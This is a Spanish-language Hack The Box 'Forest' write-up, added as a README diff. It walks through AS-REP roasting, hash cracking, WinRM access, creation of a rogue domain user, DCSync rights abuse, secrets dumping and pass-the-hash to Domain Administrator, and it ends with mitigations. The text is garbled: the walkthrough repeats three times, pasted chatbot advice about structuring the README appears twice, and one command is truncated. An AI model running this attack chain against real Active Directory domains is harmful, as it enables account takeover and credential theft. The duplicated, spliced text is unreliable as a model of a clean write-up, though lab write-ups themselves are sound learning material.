@@ -1,0 +1,201 @@
+Resumen Ejecutivo:
+
+La resolución de esta máquina se centra en la explotación de un entorno de Active Directory mediante técnicas de Kerberoasting (AS-REP Roasting) 
+y el abuso de ACLs/permisos delegados para escalar privilegios hasta Administrador del Dominio.
+
+Enumeración Inicial (Reconnaissance)
+Escaneo de Puertos (Nmap)
+Se identifica un Controlador de Dominio (DC) con los puertos estándar de AD abiertos:
+
+nmap -sC -sV -p- -T4 10.129.35.18 -oN nmap_forest.txt
+
+Puertos clave: 88 (Kerberos), 135 (RPC), 389 (LDAP), 5985 (WinRM).
+
+Enumeración de Usuarios
+Usando herramientas como rpcclient o enum4linux-ng, se logra listar los usuarios del dominio sin necesidad de credenciales (Null Session):
+
+Usuarios encontrados: svc-alfresco, mark, santi, andy, etc.
+
+Acceso Inicial (Foothold)
+AS-REP Roasting
+Se verifica si algún usuario tiene la propiedad Do not require Kerberos preauthentication activada.
+
+impacket-GetNPUsers htb.local/ -usersfile users.txt -format john -dc-ip 10.129.35.18
+
+Resultado: Se obtiene el hash del usuario svc-alfresco.
+
+Crackeo de Hash
+
+ohn --wordlist=/usr/share/wordlists/rockyou.txt alfresco.hash
+
+Credenciales: svc-alfresco : s3rvice
+
+Acceso vía WinRM
+
+evil-winrm -i 10.129.35.18 -u svc-alfresco -p 's3rvice'
+
+Escalada de Privilegios (Privilege Escalation)
+Análisis de Privilegios
+Al enumerar los grupos del usuario actual:
+
+whoami /groups
+
+Se identifica pertenencia a Account Operators y Exchange Windows Permissions. Este último permite modificar DACLs sobre el objeto del dominio.
+
+Creación de Usuario de Persistencia
+
+net user hacker P@ssw0rd123! /add /domain
+net group "Exchange Windows Permissions" hacker /add
+
+
+Para tu repositorio de GitHub, el enfoque debe ser técnico, reproducible y estructurado. Este documento servirá como tu "carta de presentación" técnica. Aquí tienes la estructura ideal para el archivo README.md dentro de tu carpeta Forest.
+
+🌲 Write-up: Forest (Hack The Box)
+Dificultad: Easy | SO: Windows | Temática: Active Directory (AD) exploitation
+
+📝 Resumen Ejecutivo
+La resolución de esta máquina se centra en la explotación de un entorno de Active Directory mediante técnicas de Kerberoasting (AS-REP Roasting) y el abuso de ACLs/permisos delegados para escalar privilegios hasta Administrador del Dominio.
+
+1. Enumeración Inicial (Reconnaissance)
+Escaneo de Puertos (Nmap)
+Se identifica un Controlador de Dominio (DC) con los puertos estándar de AD abiertos:
+
+Bash
+
+nmap -sC -sV -p- -T4 10.129.35.18 -oN nmap_forest.txt
+Puertos clave: 88 (Kerberos), 135 (RPC), 389 (LDAP), 5985 (WinRM).
+
+Enumeración de Usuarios
+Usando herramientas como rpcclient o enum4linux-ng, se logra listar los usuarios del dominio sin necesidad de credenciales (Null Session):
+
+Usuarios encontrados: svc-alfresco, mark, santi, andy, etc.
+
+2. Acceso Inicial (Foothold)
+AS-REP Roasting
+Se verifica si algún usuario tiene la propiedad Do not require Kerberos preauthentication activada.
+
+Bash
+
+impacket-GetNPUsers htb.local/ -usersfile users.txt -format john -dc-ip 10.129.35.18
+Resultado: Se obtiene el hash del usuario svc-alfresco.
+
+Crackeo de Hash
+Bash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt alfresco.hash
+Credenciales: svc-alfresco : s3rvice
+
+Acceso vía WinRM
+Bash
+
+evil-winrm -i 10.129.35.18 -u svc-alfresco -p 's3rvice'
+3. Escalada de Privilegios (Privilege Escalation)
+Análisis de Privilegios
+Al enumerar los grupos del usuario actual:
+
+PowerShell
+
+whoami /groups
+Se identifica pertenencia a Account Operators y Exchange Windows Permissions. Este último permite modificar DACLs sobre el objeto del dominio.
+
+Creación de Usuario de Persistencia
+PowerShell
+
+net user hacker P@ssw0rd123! /add /domain
+net group "Exchange Windows Permissions" hacker /add
+Abuso de DACL (WriteDACL -> DCSync)
+Desde la máquina atacante (Kali), se otorgan permisos de replicación (DCSync) al nuevo usuario:
+
+impacket-dacledit -action write -rights 'DCSync' -principal 'hacker' -target-dn 'DC=HTB,DC=LOCAL' -dc-ip 10.129.35.18 'htb.local/hacker:P@ssw0rd123!'
+
+Para tu repositorio de GitHub, el enfoque debe ser técnico, reproducible y estructurado. Este documento servirá como tu "carta de presentación" técnica. Aquí tienes la estructura ideal para el archivo README.md dentro de tu carpeta Forest.
+
+🌲 Write-up: Forest (Hack The Box)
+Dificultad: Easy | SO: Windows | Temática: Active Directory (AD) exploitation
+
+📝 Resumen Ejecutivo
+La resolución de esta máquina se centra en la explotación de un entorno de Active Directory mediante técnicas de Kerberoasting (AS-REP Roasting) y el abuso de ACLs/permisos delegados para escalar privilegios hasta Administrador del Dominio.
+
+1. Enumeración Inicial (Reconnaissance)
+Escaneo de Puertos (Nmap)
+Se identifica un Controlador de Dominio (DC) con los puertos estándar de AD abiertos:
+
+Bash
+
+nmap -sC -sV -p- -T4 10.129.35.18 -oN nmap_forest.txt
+Puertos clave: 88 (Kerberos), 135 (RPC), 389 (LDAP), 5985 (WinRM).
+
+Enumeración de Usuarios
+Usando herramientas como rpcclient o enum4linux-ng, se logra listar los usuarios del dominio sin necesidad de credenciales (Null Session):
+
+Usuarios encontrados: svc-alfresco, mark, santi, andy, etc.
+
+2. Acceso Inicial (Foothold)
+AS-REP Roasting
+Se verifica si algún usuario tiene la propiedad Do not require Kerberos preauthentication activada.
+
+Bash
+
+impacket-GetNPUsers htb.local/ -usersfile users.txt -format john -dc-ip 10.129.35.18
+Resultado: Se obtiene el hash del usuario svc-alfresco.
+
+Crackeo de Hash
+Bash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt alfresco.hash
+Credenciales: svc-alfresco : s3rvice
+
+Acceso vía WinRM
+Bash
+
+evil-winrm -i 10.129.35.18 -u svc-alfresco -p 's3rvice'
+3. Escalada de Privilegios (Privilege Escalation)
+Análisis de Privilegios
+Al enumerar los grupos del usuario actual:
+
+PowerShell
+
+whoami /groups
+Se identifica pertenencia a Account Operators y Exchange Windows Permissions. Este último permite modificar DACLs sobre el objeto del dominio.
+
+Creación de Usuario de Persistencia
+PowerShell
+
+net user hacker P@ssw0rd123! /add /domain
+net group "Exchange Windows Permissions" hacker /add
+Abuso de DACL (WriteDACL -> DCSync)
+Desde la máquina atacante (Kali), se otorgan permisos de replicación (DCSync) al nuevo usuario:
+
+Bash
+
+impacket-dacledit -action write -rights 'DCSync' -principal 'hacker' -target-dn 'DC=HTB,DC=LOCAL' -dc-ip 10.129.35.18 'htb.local/hacker:P@ssw0rd123!'
+DCSync Attack
+Volcado de la base de datos de secretos NTDS.dit:
+
+impacket-secretsdump 'htb.local/hacker:P@ssw0rd123!@10.129.35.18'
+
+Hash extraído (Administrator): 32693b11e6aa90eb43d32c72a07ceea6
+
+Post-Explotación (Root)
+Pass-the-Hash (PtH)
+Acceso final como Administrador del Dominio:
+
+evil-winrm -i 10.129.35.18 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+
+Flags:
+
+user.txt
+
+root.txt
+
+Mitigación y Recomendaciones:
+Forzar Pre-autenticación: Asegurar que todas las cuentas de usuario tengan activada la pre-autenticación de Kerberos para evitar AS-REP Roasting.
+
+Principio de Menor Privilegio: 
+Auditar los permisos del grupo Exchange Windows Permissions y restringir quién puede modificar la DACL del dominio.
+
+Monitoreo: 
+Implementar alertas ante solicitudes de replicación de directorio (DS-Replication-Get-Changes) desde equipos que no sean Controladores de Dominio.
+
+
+
